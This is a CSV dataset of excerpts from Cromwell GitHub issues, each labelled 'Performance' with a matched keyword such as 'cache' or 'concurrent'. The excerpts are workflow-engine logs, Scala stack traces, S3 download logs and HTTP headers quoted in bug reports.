Performance,"18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2218,cache,cache,2218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance,"19]; at cromwell.engine.backend.local.SharedFileSystem$class.adjustSharedInputPaths(SharedFileSystem.scala:224) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustSharedInputPaths(LocalBackend.scala:94) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustInputPaths(LocalBackend.scala:96) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.instantiateCommand(LocalBackend.scala:246) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand$lzycompute(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:115) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:113) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell-0.19.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell-0.19.jar:0.19]; 2016-05-27 11:08:57,270 cromwell-system-akka.actor.default-dispatcher-4 ERROR - Failures during localization; java.lang.UnsupportedOperationException: Could ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/922:8263,concurren,concurrent,8263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/922,1,['concurren'],['concurrent']
Performance,"19]; at cromwell.engine.backend.local.SharedFileSystem$class.adjustSharedInputPaths(SharedFileSystem.scala:224) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustSharedInputPaths(LocalBackend.scala:94) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustInputPaths(LocalBackend.scala:96) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.instantiateCommand(LocalBackend.scala:246) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand$lzycompute(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:115) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:113) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell-0.19.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell-0.19.jar:0.19]; 2016-05-27 11:08:57,270 cromwell-system-akka.actor.default-dispatcher-5 ERROR - Failures during localization; java.lang.UnsupportedOperationException: Could ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/922:4186,concurren,concurrent,4186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/922,1,['concurren'],['concurrent']
Performance,"19]; at cromwell.engine.backend.local.SharedFileSystem$class.adjustSharedInputPaths(SharedFileSystem.scala:224) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustSharedInputPaths(LocalBackend.scala:94) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustInputPaths(LocalBackend.scala:96) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.instantiateCommand(LocalBackend.scala:246) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand$lzycompute(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:115) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:113) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell-0.19.jar:0.19]; 2016-05-27 11:08:57,271 cromwell-system-akka.actor.default-dispatcher-4 ERROR - BackendCallExecutionActor [UUID(8c7774be):BillyBob]: Failures during localiz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/922:12340,concurren,concurrent,12340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/922,1,['concurren'],['concurrent']
Performance,19]; at cromwell.engine.backend.local.SharedFileSystem$class.adjustSharedInputPaths(SharedFileSystem.scala:228) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustSharedInputPaths(LocalBackend.scala:94) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.adjustInputPaths(LocalBackend.scala:96) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend.instantiateCommand(LocalBackend.scala:246) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand$lzycompute(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:115) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:113) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell-0.19.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell-0.19.jar:0.19]; ```. Full log:; [workflow.8a4e2219-90e2-4210-a753-26b149c18b51.txt](https://github.com/broadinstitute/cromwell/files/332863/workflow.8a4e2219-90e2-4210-a753-,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1070:2310,concurren,concurrent,2310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1070,1,['concurren'],['concurrent']
Performance,19]; at cromwell.engine.workflow.CallMetadataBuilder$.build(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:95) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:85) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.pollAndExecAll(ForkJoinPool.java:1253) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTas,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:3023,concurren,concurrent,3023,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,1,['concurren'],['concurrent']
Performance,"1: Workflow input processing failed:; Boxed Error; ```. The specs say this should be possible, 0x9 == tab:; https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#whitespace-strings-identifiers-constants. I have tested cromwell 34 and the current develop branch (ce27a93). wdl file that I used (replaced '\t' with '\<tab\>'); ```; version 1.0. workflow Test {; <tab>input {; <tab><tab>; <tab>}. <tab>call Echo as echo {; <tab>input:; <tab>}. <tab>output {; <tab>}; }. task Echo {; <tab>input {; <tab>}. <tab>command {; <tab><tab>kill -9 $$; <tab><tab>echo test; <tab>}. <tab>output {; <tab>}; }; ```. Full stacktrace:; ```; [2018-08-29 09:25:20,10] [error] WorkflowManagerActor Workflow 1ed0e19c-fa18-4241-8f6b-0b72e181f59a failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workfl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:1317,concurren,concurrent,1317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['concurren'],['concurrent']
Performance,"1: on google, generating a psURL and calling HEAD on it (which you can also do with a GET and only as for the 1st byte). HTTP/2 200 ; x-guploader-uploadid: AEnB2Uo10d8ECr7tR5601R8roi8MIXlzvg1rjyMui9wavFC7KO2Pv2QBk94Qv22mgAz5Ih0nnayc2kXj5XBFgRUqkNTJNtAo7Q; expires: Fri, 29 Jun 2018 15:56:42 GMT; date: Fri, 29 Jun 2018 15:56:42 GMT; cache-control: private, max-age=0; last-modified: Fri, 29 Jun 2018 15:53:49 GMT; etag: ""09f7e02f1290be211da707a266f153b3""; x-goog-generation: 1530287629024005; x-goog-metageneration: 1; x-goog-stored-content-encoding: identity; x-goog-stored-content-length: 6; content-type: text/plain; content-language: en; x-goog-hash: crc32c=sMnOMw==; x-goog-hash: md5=CffgLxKQviEdpweiZvFTsw==; x-goog-storage-class: STANDARD; accept-ranges: bytes; content-length: 6; server: UploadServer; alt-svc: quic="":443""; ma=2592000; v=""43,42,41,39,35""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990:333,cache,cache-control,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990,1,['cache'],['cache-control']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi; 1608597421803,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi; 1608597424089,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz; 1608597426322,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidence",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:131919,cache,cacheCopy,131919,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi; 1608597054920,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi; 1608597057531,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz; 1608597060059,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:32177,cache,cacheCopy,32177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi; 1608597167270,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz; 1608597169668,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz; 1608597172290,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:62720,cache,cacheCopy,62720,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi; 1608597548876,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz; 1608597550096,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi; 1608597552897,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:170211,cache,cacheCopy,170211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
